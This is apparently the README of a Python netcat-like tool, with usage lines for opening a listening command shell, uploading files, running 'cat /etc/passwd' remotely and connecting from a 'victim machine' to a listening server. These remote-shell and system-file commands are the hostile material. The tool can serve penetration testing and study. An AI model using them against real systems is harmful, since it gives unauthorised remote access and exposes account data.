# Netcat-with-Maxey
<br> Netcat like tool made in python3. 
<br> Use case is if I have access to a box that has limited resources but does have python available for use.

How to:
<br>    maxey.py -t 192.168.1.108 -p 5555 -l -c # command shell 
<br>    maxey.py -t 192.168.1.108 -p 5555 -l -u=mytest.txt # upload to file
<br>    maxey.py -t 192.168.1.108 -p 5555 -l -e\"cat /etc/passwd\" # execute command 
<br>    echo 'ABC' | ./maxey -t 192.168.1.108 -p 135 # echo text to server port 135 
<br>    maxey.py -t 192.168.1.108 -p 5555 # connect to server

<br> If you are using on the victim machine and trying to connect to the listening server make sure to press Ctrl-D after you initiate the connect command! 
